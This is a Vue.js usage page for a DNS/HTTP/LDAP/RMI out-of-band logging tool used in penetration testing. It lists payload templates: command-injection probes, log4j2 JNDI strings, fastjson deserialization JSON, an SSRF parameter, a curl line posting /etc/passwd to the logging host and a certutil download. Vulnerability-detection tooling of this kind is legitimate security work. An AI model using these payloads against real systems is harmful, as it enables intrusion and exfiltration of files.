<template>
  <div class="app-container">
    <el-row :gutter="20">
      <el-col :span="24" :xs="24">
        <el-card>
          <div>
            <a href="/"><img src="/dnslog_thin.png" alt="cola dnslog" width="150px"></a>
          </div>
          <hr>
          <div class="user-usage">
            <h1>Usage</h1>
            <div class="post">
              <h2><a href="/#/dnslog/index">Dnslog</a></h2>
              <p>
                RCE:
                <code>nslookup `whoami`.{{ my_domain }}</code>
                &nbsp;
                <code>ping `whoami`.{{ my_domain }}</code>
                <br>
                log4j2:
                <code>${jndi:ldap://ldap.{{ my_domain }}/123}</code>
                &nbsp;
                <code>${jndi:rmi://rmi.{{ my_domain }}/123}</code>
                <br>
                fastjson:
                <code>{
                  "b":{
                  "@type":"com.sun.rowset.JdbcRowSetImpl",
                  "dataSourceName":"rmi://fastjson.{{ my_domain }}/Exploit",
                  "autoCommit":true
                  }
                  }
                </code>
              </p>
            </div>
            <div class="post">
              <h2><a href="/#/httplog/index">Httplog</a></h2>
              Now juse support GET POST HEAD request
              <br>
              <p>
                RCE:
                <code>curl http://{{ http }}/{{ logid }}/xxx</code>
                &nbsp;
                <code>curl -d @/etc/passwd http://{{ http }}/{{ logid }}/xxx</code>
                &nbsp;
                <code>certutil -urlcache -split -f
                  http://{{ http }}/{{ logid }}/xxx xxx</code>
                <br>
                SSRF:
                <code>?url=http://{{ http }}/{{ logid }}/xxx</code>
              </p>
            </div>
            <div class="post">
              <h2><a href="/#/ldaplog/index">Ldaplog</a></h2>
              Need end with <code style="margin:0; padding:0;">{{ logid }}</code>
              <p>
                log4j2:
                <code>${jndi:ldap://{{ ldap }}/xxxx{{ logid }}}</code>
                <br>
                fastjson:
                <code>{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://{{ ldap }}/xxxx{{ logid }}",
                  "autoCommit":true}</code>
              </p>
            </div>
            <div class="post">
              <h2><a href="/#/rmilog/index">Rmilog</a></h2>
              Need end with <code style="margin:0; padding:0;">{{ logid }}</code>
              <p>
                log4j2:
                <code>${jndi:rmi://{{ rmi }}/xxxx{{ logid }}}</code>
                <br>
                fastjson:
                <code>{
                  "b":{
                  "@type":"com.sun.rowset.JdbcRowSetImpl",
                  "dataSourceName":"rmi://{{ rmi }}/xxxx{{ logid }}",
                  "autoCommit":true
                  }
                  }</code>
              </p>
            </div>
          </div>
        </el-card>
      </el-col>
    </el-row>
  </div>
</template>

<script>
import { getMyServerinfo } from '@/api/user'

export default {
  name: 'Usage',
  data() {
    return {
      userinfo: {},
      my_domain: '',
      http: '',
      ldap: '',
      rmi: '',
      logid: ''
    }
  },
  mounted() {
    this.formKeyArr = []
    this.getInfo()
  },
  methods: {
    getInfo() {
      getMyServerinfo().then((res) => {
        this.my_domain = res.data.domain
        this.http = res.data.http
        this.ldap = res.data.ldap
        this.rmi = res.data.rmi
        this.logid = res.data.logid
      })
    }
  }
}
</script>

<style lang="scss" scoped>
.command-tag {
  font-size: 15px;
}

.user-activity {
  .user-block {

    .username,
    .description {
      display: block;
      margin-left: 50px;
      padding: 2px 0;
    }

    .username {
      font-size: 16px;
      color: #000;
    }

    :after {
      clear: both;
    }

    .img-circle {
      border-radius: 50%;
      width: 40px;
      height: 40px;
      float: left;
    }

    span {
      font-weight: 500;
      font-size: 12px;
    }
  }

  .post {
    font-size: 14px;
    border-bottom: 1px solid #d2d6de;
    margin-bottom: 15px;
    padding-bottom: 15px;
    color: #666;

    .image {
      width: 100%;
      height: 100%;

    }

    .user-images {
      padding-top: 20px;
    }
  }

  .list-inline {
    padding-left: 0;
    margin-left: -5px;
    list-style: none;

    li {
      display: inline-block;
      padding-right: 5px;
      padding-left: 5px;
      font-size: 13px;
    }

    .link-black {

      &:hover,
      &:focus {
        color: #999;
      }
    }
  }

}

.box-center {
  margin: 0 auto;
  display: table;
}

.text-muted {
  color: #777;
}

code {
  font-size: 15px;
  border: 1px solid rgb(208, 245, 224);
  background-color: rgb(231, 250, 240);
  border-radius: 4px;
  color: rgb(3, 148, 68);
  padding: 0px 8px;
  margin: 0 0 0 10px;
}

p {
  line-height: 1.5;
  border-left: 5px solid #6900d2;
  padding-left: 10px;
}
</style>
